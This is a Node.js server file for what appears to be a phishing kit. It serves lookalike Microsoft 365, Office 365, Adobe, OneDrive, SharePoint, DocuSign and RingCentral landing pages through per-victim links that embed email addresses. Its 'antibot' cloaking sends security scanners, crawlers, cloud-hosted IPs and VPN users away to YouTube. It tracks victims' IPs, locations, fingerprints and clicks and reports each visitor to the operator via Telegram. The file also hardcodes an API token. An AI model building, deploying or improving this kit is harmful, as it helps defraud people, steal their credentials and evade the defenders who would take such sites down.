// server.js - Complete with Server-Side Antibot First
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const rateLimit = require('express-rate-limit');
const fs = require('fs').promises;
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;
const DOCUMENT_URL = process.env.DOCUMENT_URL || 'https://example.com/your-secure-document';
const TOKEN_TTL_MS = (parseInt(process.env.TOKEN_TTL_MIN || '10', 10) * 60 * 1000);
const IPINFO_TOKEN = '6646828ead20c6'; // Your ipinfo.io token

app.use(express.json());
app.set('trust proxy', 1);

// ===== DATA STORAGE =====
let tokens = {};
let accessLogs = [];
let reportedIPs = new Set();
let landingLinks = {};
let linkEmails = {};
let visitorRecords = [];
let clickStats = [];

// IP Cache to avoid repeated lookups (cache for 1 hour)
const ipCache = new Map();
const IP_CACHE_DURATION = 60 * 60 * 1000; // 1 hour

// Security check cache - stores results for each IP for current session
const securityCheckCache = new Map();

const DATA_FILE = path.join(__dirname, 'antibot-data.json');
const CLICKS_FILE = path.join(__dirname, 'clicks-data.json');

// ===== LOAD DATA ON STARTUP =====
async function loadData() {
    try {
        const data = await fs.readFile(DATA_FILE, 'utf8');
        visitorRecords = JSON.parse(data);
        console.log(`✅ Loaded ${visitorRecords.length} visitor records`);
    } catch (error) {
        if (error.code === 'ENOENT') {
            console.log('📁 No existing data file, starting fresh');
        } else {
            console.error('⚠️  Error loading data:', error.message);
        }
        visitorRecords = [];
        // Don't await save on startup to avoid blocking
        saveData().catch(err => console.error('Initial save error:', err));
    }
    
    try {
        const clicks = await fs.readFile(CLICKS_FILE, 'utf8');
        clickStats = JSON.parse(clicks);
        console.log(`✅ Loaded ${clickStats.length} click records`);
    } catch (error) {
        if (error.code === 'ENOENT') {
            console.log('📁 No existing clicks file, starting fresh');
        } else {
            console.error('⚠️  Error loading clicks:', error.message);
        }
        clickStats = [];
        // Don't await save on startup to avoid blocking
        saveClickData().catch(err => console.error('Initial click save error:', err));
    }
}

// ===== SAVE DATA =====
async function saveData() {
    try {
        await fs.writeFile(DATA_FILE, JSON.stringify(visitorRecords, null, 2));
    } catch (error) {
        console.error('❌ Error saving data:', error.message);
    }
}

async function saveClickData() {
    try {
        await fs.writeFile(CLICKS_FILE, JSON.stringify(clickStats, null, 2));
    } catch (error) {
        console.error('❌ Error saving click data:', error.message);
    }
}

// Initialize data (don't block server startup)
loadData().catch(err => console.error('Data load error:', err));

// Clear old IP cache entries every hour
setInterval(() => {
    const now = Date.now();
    for (const [ip, data] of ipCache.entries()) {
        if (now - data.timestamp > IP_CACHE_DURATION) {
            ipCache.delete(ip);
        }
    }
    console.log(`🧹 Cache cleanup: ${ipCache.size} IPs cached`);
}, IP_CACHE_DURATION);

// Default landing templates
const defaultPages = {
  "365.html": "<h1>Microsoft 365 Landing</h1>",
  "adobe.html": "<h1>Adobe Sign-in Page</h1>",
  "auto_redirect.html": "<h1>Auto Redirect Landing</h1>",
  "office365.html": "<h1>Office 365 Landing</h1>",
  "rincentral.html": "<h1>RingCentral Landing</h1>",
  "voice.html": "<h1>Voice Portal Landing</h1>",
  "docu.html": "<h1>Docu Landing</h1>",
  "exceel.html": "<h1>Excel Landing</h1>",
  "docsign.html": "<h1>Docsign Landing</h1>",
  "fax_notification.html": "<h1>Fax Portal Landing</h1>",
  "drop.html": "<h1>Drop Landing</h1>",
  "onedrive.html": "<h1>OneDrive Landing</h1>",
  "sharepoint.html": "<h1>SharePoint Landing</h1>",
  "rignce.html": "<h1>RingCe Landing</h1>",
};

// Logging helper
function logLine(line) {
  const stamp = new Date().toISOString();
  const entry = `[${stamp}] ${line}`;
  accessLogs.push(entry);
  console.log(entry);
}

// Rate limiter
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_PER_MIN || '60', 10),
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logLine(`RATE_LIMIT_EXCEEDED ip=${getClientIp(req)} path=${req.originalUrl}`);
    res.status(429).send('Too many requests. Try again later.');
  }
});
app.use(limiter);

// Static assets
app.use('/static', express.static(path.join(__dirname)));
app.use(express.static(path.join(__dirname)));

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function getClientIp(req) {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip || '';
  if (ip.includes(',')) ip = ip.split(',')[0];
  return ip.replace('::ffff:', '').trim();
}

// ===== SERVER-SIDE ANTIBOT CHECK =====
// ===== IMPROVED SERVER-SIDE ANTIBOT CHECK =====
async function checkVisitorSecurity(req) {
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || '';
    
    // Check if we already validated this IP in this session
    const cached = securityCheckCache.get(ip);
    if (cached && (Date.now() - cached.timestamp < 300000)) { // 5 min cache
        console.log(`✅ Using cached security check for ${ip}: ${cached.shouldBlock ? 'BLOCKED' : 'ALLOWED'}`);
        return cached;
    }
    
    // Bot detection patterns - MORE SPECIFIC
    const botPatterns = [
        /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
        /headless/i, /phantom/i, /selenium/i, /webdriver/i, /scraper/i,
        /curl\/[\d.]+$/i, // Only match standalone curl
        /wget\/[\d.]+$/i, // Only match standalone wget
        /python-requests/i, /python-urllib/i, // Python bots
        /java\/[\d.]+$/i, // Standalone Java
        /go-http-client/i, /ruby\/[\d.]+$/i // Go and Ruby bots
    ];
    
    const isBot = botPatterns.some(pattern => pattern.test(userAgent));
    
    // Default location data
    let locationData = {
        ip: ip,
        country: 'Unknown',
        countryName: 'Unknown',
        city: 'Unknown',
        org: 'Unknown',
        isp: 'Unknown',
        ipType: 'Unknown'
    };
    
    // Check IP info cache
    const ipCached = ipCache.get(ip);
    if (ipCached && (Date.now() - ipCached.timestamp < IP_CACHE_DURATION)) {
        locationData = ipCached.data;
        console.log(`✅ Using cached IP data for ${ip}`);
    } else {
        // Fetch with timeout
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            
            const response = await fetch(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`, {
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            
            const data = await response.json();
            
            locationData = {
                ip: data.ip || ip,
                hostname: data.hostname,
                city: data.city,
                region: data.region,
                country: data.country,
                countryName: getCountryName(data.country),
                loc: data.loc,
                org: data.org,
                postal: data.postal,
                timezone: data.timezone,
                asn: extractASN(data.org),
                isp: data.org ? data.org.split(' ').slice(1).join(' ') : 'Unknown'
            };
            
            // Cache the result
            ipCache.set(ip, {
                data: locationData,
                timestamp: Date.now()
            });
            
            console.log(`✅ Fetched and cached IP data for ${ip}`);
            
        } catch (error) {
            console.error('IP lookup error:', error.message);
        }
    }
    
    // ===== IMPROVED VPN/PROXY/HOSTING DETECTION =====
    
    // Known cloud/hosting providers - BE VERY SPECIFIC
    const cloudProviders = [
        'digitalocean', 'digital ocean',
        'amazon web services', 'aws', 'amazon data services', 'amazon.com',
        'google cloud', 'google llc',
        'microsoft corporation', 'microsoft azure', 'azure',
        'linode', 'akamai', 'akamai technologies',
        'vultr', 'choopa',
        'ovh', 'ovh sas', 'ovh hosting',
        'scaleway',
        'hetzner', 'hetzner online',
        'rackspace',
        'cloudflare', 'cloudflare inc',
        'fastly',
        'contabo'
    ];

    // Datacenter/hosting keywords - MUST BE SPECIFIC
    const datacenterKeywords = [
        'data center', 'datacenter', 'data centre', 'datacentre',
        'colocation', 'colo facility',
        'server farm',
        'dedicated server', 'dedicated hosting',
        'vps hosting', 'virtual private server'
    ];

    // Known VPN providers and keywords
    const vpnKeywords = [
        'vpn', 'virtual private network',
        'proxy', 'proxy server',
        'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'cyberghost',
        'privatevpn', 'purevpn', 'ipvanish', 'tunnelbear',
        'hide my ass', 'hidemyass', 'hma',
        'private internet access', 'pia-vpn',
        'windscribe', 'hotspot shield'
    ];

    // Legitimate ISP keywords that should NEVER be blocked
    const legitISPKeywords = [
        'telecom', 'telecommunications', 'telephone',
        'mobile', 'cellular', 'wireless',
        'broadband', 'internet service',
        'cable', 'fiber', 'fibre',
        'isp', 'internet provider',
        'communications', 'networks limited', 'networks ltd'
    ];

    const org = (locationData.org || '').toLowerCase();
    const hostname = (locationData.hostname || '').toLowerCase();
    
    // Check if it's a legitimate ISP first
    const isLegitISP = legitISPKeywords.some(k => org.includes(k));
    
    // Only check for cloud/datacenter if NOT a legit ISP
    const isCloudProvider = !isLegitISP && cloudProviders.some(p => org.includes(p) || hostname.includes(p));
    const isDatacenter = !isLegitISP && datacenterKeywords.some(k => org.includes(k) || hostname.includes(k));
    const isVPN = vpnKeywords.some(k => org.includes(k) || hostname.includes(k));

    // Known bad ASNs (actual datacenter/hosting ASNs)
    const suspiciousASNs = [
        '16509', // Amazon AWS
        '15169', // Google Cloud
        '8075',  // Microsoft
        '13335', // Cloudflare
        '14061', // DigitalOcean
        '20473', // Choopa/Vultr
        '16276', // OVH
        '24940', // Hetzner
        '396982' // Google Cloud Platform
    ];
    const isSuspiciousASN = suspiciousASNs.includes(locationData.asn);
    
    // Final determination - only flag if definitely hosting/VPN
    const isNonResidential = isCloudProvider || isDatacenter || isVPN || isSuspiciousASN;
    
    // Set IP type
    if (isVPN) {
        locationData.ipType = 'VPN/Proxy';
    } else if (isCloudProvider) {
        locationData.ipType = 'Cloud Provider';
    } else if (isDatacenter) {
        locationData.ipType = 'Data Center';
    } else if (isSuspiciousASN) {
        locationData.ipType = 'Suspicious Network';
    } else {
        locationData.ipType = 'Residential/ISP';
    }
    
    locationData.isVPN = isVPN;
    locationData.isDataCenter = isCloudProvider || isDatacenter;
    
    // ===== DETERMINE IF SHOULD BLOCK =====
    let shouldBlock = false;
    let blockReason = '';
    
    if (isBot) {
        shouldBlock = true;
        blockReason = 'Bot detected: Bot user-agent';
    } else if (isNonResidential) {
        shouldBlock = true;
        blockReason = `Non-residential IP: ${locationData.ipType}`;
    }
    
    // Log visitor
    const visitorData = {
        id: crypto.randomBytes(8).toString('hex'),
        timestamp: new Date().toISOString(),
        status: shouldBlock ? 'BLOCKED' : 'ALLOWED',
        reason: shouldBlock ? blockReason : 'Legitimate visitor',
        ...locationData,
        isBot: isBot,
        userAgent: userAgent,
        pageUrl: req.protocol + '://' + req.get('host') + req.originalUrl,
        referrer: req.headers.referer || 'Direct'
    };
    
    // Save visitor record
    visitorRecords.unshift(visitorData);
    if (visitorRecords.length > 5000) {
        visitorRecords = visitorRecords.slice(0, 5000);
    }
    await saveData();
    
    // Log to console
    logLine(`ANTIBOT: ${visitorData.status} | ${ip} | ${locationData.country} | ${visitorData.reason}`);
    
    // Send to Telegram
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
        await sendToTelegram(visitorData);
    }
    
    const result = { shouldBlock, blockReason, visitorData };
    
    // Cache security check result
    securityCheckCache.set(ip, {
        ...result,
        timestamp: Date.now()
    });
    
    return result;
}


// Extract ASN
function extractASN(org) {
    if (!org) return null;
    const match = org.match(/AS(\d+)/);
    return match ? match[1] : null;
}

// Country name
function getCountryName(code) {
    const countries = {
        'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada',
        'AU': 'Australia', 'DE': 'Germany', 'FR': 'France', 'IT': 'Italy',
        'ES': 'Spain', 'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway',
        'DK': 'Denmark', 'FI': 'Finland', 'PL': 'Poland', 'RU': 'Russia',
        'CN': 'China', 'JP': 'Japan', 'KR': 'South Korea', 'IN': 'India',
        'BR': 'Brazil', 'MX': 'Mexico', 'AR': 'Argentina', 'NG': 'Nigeria',
        'ZA': 'South Africa', 'EG': 'Egypt', 'SA': 'Saudi Arabia'
    };
    return countries[code] || code;
}

// ===== ANTIBOT REPORT ENDPOINT (CLIENT-SIDE) =====
app.post('/__antibot-report', async (req, res) => {
    try {
        const ip = getClientIp(req);
        
        // Check if we already have a server-side record for this IP
        const existingRecord = visitorRecords.find(v => 
            v.ip === ip && 
            Math.abs(new Date(v.timestamp) - new Date()) < 60000 // Within last minute
        );

        if (existingRecord) {
            // Update existing server-side record with client-side data
            existingRecord.clientStatus = req.body.status;
            existingRecord.clientReason = req.body.reason;
            existingRecord.clientBot = req.body.isBot;
            existingRecord.clientBotReason = req.body.botReason;
            existingRecord.fingerprint = req.body.fingerprint;
            existingRecord.clientIPType = req.body.ipType;
            existingRecord.clientVPN = req.body.isVPN;
            existingRecord.clientDataCenter = req.body.isDataCenter;
            
            logLine(`CLIENT_UPDATE: ${ip} | Client: ${req.body.status} | ${req.body.reason || 'N/A'}`);
            
            await saveData();
        } else {
            // Create new record from client-side data only
            const reportData = {
                id: crypto.randomBytes(8).toString('hex'),
                timestamp: req.body.timestamp || new Date().toISOString(),
                status: req.body.status || 'UNKNOWN',
                reason: req.body.reason || 'Client-side only',
                
                // IP and location from client
                ip: req.body.ip || ip,
                country: req.body.country || 'Unknown',
                countryName: req.body.countryName || 'Unknown',
                city: req.body.city || 'Unknown',
                region: req.body.region || 'Unknown',
                loc: req.body.coordinates || 'Unknown',
                org: req.body.org || 'Unknown',
                isp: req.body.isp || 'Unknown',
                asn: req.body.asn || null,
                hostname: req.body.hostname || 'Unknown',
                postal: req.body.postal || 'Unknown',
                timezone: req.body.timezone || 'Unknown',
                
                // Bot detection
                isBot: req.body.isBot || false,
                botReason: req.body.botReason || null,
                userAgent: req.body.userAgent || req.headers['user-agent'] || 'Unknown',
                
                // IP type
                ipType: req.body.ipType || 'Unknown',
                isVPN: req.body.isVPN || false,
                isDataCenter: req.body.isDataCenter || false,
                
                // Fingerprint
                fingerprint: req.body.fingerprint || {},
                
                // Page info
                pageUrl: req.body.pageUrl || 'Unknown',
                referrer: req.body.referrer || req.headers.referer || 'Direct',
                
                // Mark as client-side only
                source: 'client'
            };

            visitorRecords.unshift(reportData);
            if (visitorRecords.length > 5000) {
                visitorRecords = visitorRecords.slice(0, 5000);
            }
            
            logLine(`CLIENT_ANTIBOT: ${reportData.status} | ${ip} | ${req.body.reason || 'N/A'}`);
            
            await saveData();
        }

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('❌ Antibot report error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ===== CLICK TRACKING ENDPOINT =====
app.post('/__track-click', async (req, res) => {
    try {
        const clickData = {
            ...req.body,
            ip: getClientIp(req),
            id: crypto.randomBytes(8).toString('hex'),
            timestamp: new Date().toISOString()
        };

        clickStats.push(clickData);

        if (clickStats.length > 10000) {
            clickStats = clickStats.slice(-10000);
        }

        // Save immediately for important clicks
        await saveClickData();

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('❌ Click tracking error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ===== GET ANTIBOT DATA ENDPOINT =====
app.get('/__get-antibot-data', (req, res) => {
    try {
        const stats = {
            totalVisitors: visitorRecords.length,
            allowed: visitorRecords.filter(v => v.status === 'ALLOWED').length,
            blocked: visitorRecords.filter(v => v.status === 'BLOCKED').length,
            bots: visitorRecords.filter(v => v.isBot).length,
            vpn: visitorRecords.filter(v => v.isVPN).length,
            dataCenter: visitorRecords.filter(v => v.isDataCenter).length,
            totalClicks: clickStats.length
        };

        res.json({
            visitors: visitorRecords,
            clicks: clickStats,
            stats: stats
        });
    } catch (error) {
        console.error('❌ Error fetching data:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ===== TELEGRAM NOTIFICATION =====
async function sendToTelegram(data) {
    try {
        const statusEmoji = data.status === 'ALLOWED' ? '✅' : '🚫';
        const message = `
${statusEmoji} *${data.status}*

*Reason:* ${data.reason}
*IP:* \`${data.ip}\`
*Location:* ${data.city}, ${data.countryName} (${data.country})
*ISP:* ${data.isp}
*Type:* ${data.ipType}
*User Agent:* ${data.userAgent}
*Page:* ${data.pageUrl}
*Time:* ${new Date(data.timestamp).toLocaleString()}
        `.trim();

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('❌ Telegram error:', error);
    }
}

// ===== ADMIN LOGIN =====
app.post('/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// ===== CREATE LINK =====
app.post('/admin/create-link', (req, res) => {
  const { landingPage } = req.body;
  const validPages = Object.keys(defaultPages);

  if (!validPages.includes(landingPage)) {
    return res.status(400).json({ error: 'Invalid landing page' });
  }

  const randomPath = crypto.randomBytes(8).toString('hex');
  landingLinks[randomPath] = landingPage;

  const fullUrl = `${req.protocol}://${req.get('host')}/${randomPath}`;
  logLine(`NEW_LINK page=${landingPage} url=${fullUrl}`);
  res.json({ url: fullUrl });
});

// ===== CONFIG ENDPOINT =====
app.get('/config', (req, res) => {
  const email = req.query.email;
  if (email && email.length > 2 && email !== 'undefined' && email !== 'null') {
    res.json({ DOCUMENT_URL: `${DOCUMENT_URL}#${email}` });
  } else {
    res.json({ DOCUMENT_URL });
  }
});

// ===== REDIRECT HANDLER =====
app.get("/redirect", (req, res) => {
  const email = req.query.email;
  if (email && email.length > 2) {
    res.redirect(`${DOCUMENT_URL}#${email}`);
  } else {
    res.redirect(DOCUMENT_URL);
  }
});

// ===== LANDING PAGE HANDLER WITH SECURITY CHECK FIRST =====
app.get('/:pathId', async (req, res, next) => {
  const { pathId } = req.params;

  // Check if this is a valid landing page link
  if (!landingLinks[pathId]) {
    return next(); // Not a landing page, continue to next handler
  }

  const clientIp = getClientIp(req);
  
  // Skip security check for localhost/development
  const isLocalhost = clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === '::ffff:127.0.0.1';
  
  if (!isLocalhost) {
    // 🚨 CRITICAL: SECURITY CHECK FIRST - MUST COMPLETE BEFORE ANY TOKEN LOGIC
    console.log(`🔍 Running security check for ${clientIp}...`);
    const securityCheck = await checkVisitorSecurity(req);
    console.log(`✅ Security check complete: ${securityCheck.shouldBlock ? 'BLOCKED' : 'ALLOWED'}`);
    
    if (securityCheck.shouldBlock) {
      // 🚫 BLOCKED - Redirect to YouTube immediately
      logLine(`BLOCKED_REDIRECT ip=${clientIp} reason=${securityCheck.blockReason}`);
      return res.redirect('https://www.youtube.com');
    }
  } else {
    console.log(`⚠️  Localhost detected (${clientIp}) - skipping security check`);
  }
  
  // ✅ SECURITY PASSED - Now handle token logic
  const token = req.query.token;
  const email = req.query.email;

  // Issue new token if missing or invalid
  if (!token || !tokens[token]) {
    const newToken = generateToken();
    tokens[newToken] = { 
      createdAt: Date.now(), 
      ip: clientIp, 
      used: false, 
      ttl: TOKEN_TTL_MS 
    };
    logLine(`TOKEN_ISSUED token=${newToken} pathId=${pathId} ip=${clientIp}`);
    
    // Redirect with new token
    const redirectUrl = email && email !== 'undefined' 
      ? `/${pathId}?token=${newToken}&email=${email}`
      : `/${pathId}?token=${newToken}`;
    
    return res.redirect(redirectUrl);
  }

  // Check if token is valid
  const tokenData = tokens[token];
  const isTokenExpired = Date.now() - tokenData.createdAt > TOKEN_TTL_MS;
  const isWrongIp = tokenData.ip !== clientIp;
  
  if (tokenData.used || isTokenExpired || isWrongIp) {
    // Rotate token
    const newToken = generateToken();
    tokens[newToken] = { 
      createdAt: Date.now(), 
      ip: clientIp, 
      used: false, 
      ttl: TOKEN_TTL_MS 
    };
    tokens[token].used = true;
    
    const reason = tokenData.used ? 'used' : isTokenExpired ? 'expired' : 'wrong_ip';
    logLine(`TOKEN_ROTATED old=${token} new=${newToken} reason=${reason}`);
    
    // Redirect with new token
    const redirectUrl = email && email !== 'undefined'
      ? `/${pathId}?token=${newToken}&email=${email}`
      : `/${pathId}?token=${newToken}`;
    
    if (email && email !== 'undefined') {
      linkEmails[pathId] = email;
    }
    
    return res.redirect(redirectUrl);
  }

  // ✅ Valid token - Mark as used and serve landing page
  tokens[token].used = true;
  logLine(`TOKEN_CONSUMED token=${token} pathId=${pathId} ip=${clientIp}`);

  const filePath = path.join(__dirname, landingLinks[pathId]);
  
  // Try to read custom landing page file
  try {
    const fileContent = await fs.readFile(filePath, 'utf8');
    
    // Inject click tracking script
    const trackingScript = `
      <script src="/antibot.js"></script>
      <script>
        window.__EMAIL__ = "${(email || '').replace(/"/g, '\\"')}";
        window.__REDIRECT_URL__ = ${email && email !== 'undefined'} ? "${DOCUMENT_URL}#${email}" : "${DOCUMENT_URL}";
      </script>`;
    
    let modifiedContent = fileContent;
    if (modifiedContent.includes('</head>')) {
      modifiedContent = modifiedContent.replace('</head>', `${trackingScript}</head>`);
    } else if (modifiedContent.includes('</body>')) {
      modifiedContent = modifiedContent.replace('</body>', `${trackingScript}</body>`);
    } else {
      modifiedContent += trackingScript;
    }
    
    res.send(modifiedContent);
    
  } catch (err) {
    // File doesn't exist, use default page
    logLine(`FILE_NOT_FOUND serving default: ${landingLinks[pathId]}`);
    
    const trackingScript = `
      <script src="/antibot.js"></script>
      <script>
        window.__EMAIL__ = "${(email || '').replace(/"/g, '\\"')}";
        window.__REDIRECT_URL__ = ${email && email !== 'undefined'} ? "${DOCUMENT_URL}#${email}" : "${DOCUMENT_URL}";
      </script>`;
    
    let defaultPage = defaultPages[landingLinks[pathId]];
    if (defaultPage.includes('</body>')) {
      defaultPage = defaultPage.replace('</body>', `${trackingScript}</body>`);
    } else if (defaultPage.includes('</head>')) {
      defaultPage = defaultPage.replace('</head>', `${trackingScript}</head>`);
    } else {
      defaultPage += trackingScript;
    }
    
    res.send(defaultPage);
  }
});

// ===== SERVE ADMIN PANEL =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "login_admin.html"));
});

// ===== STATUS ENDPOINT =====
app.get('/__status', (req, res) => {
  res.json({
    status: 'ok',
    tokens_in_memory: Object.keys(tokens).length,
    logs_in_memory: accessLogs.length,
    reported_ips: Array.from(reportedIPs),
    active_links: landingLinks,
    visitor_records: visitorRecords.length,
    click_stats: clickStats.length
  });
});

// Listen
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running on http://0.0.0.0:${PORT}`);
  console.log(`📊 Loaded ${visitorRecords.length} visitor records`);
  console.log(`🖱️  Loaded ${clickStats.length} click records`);
});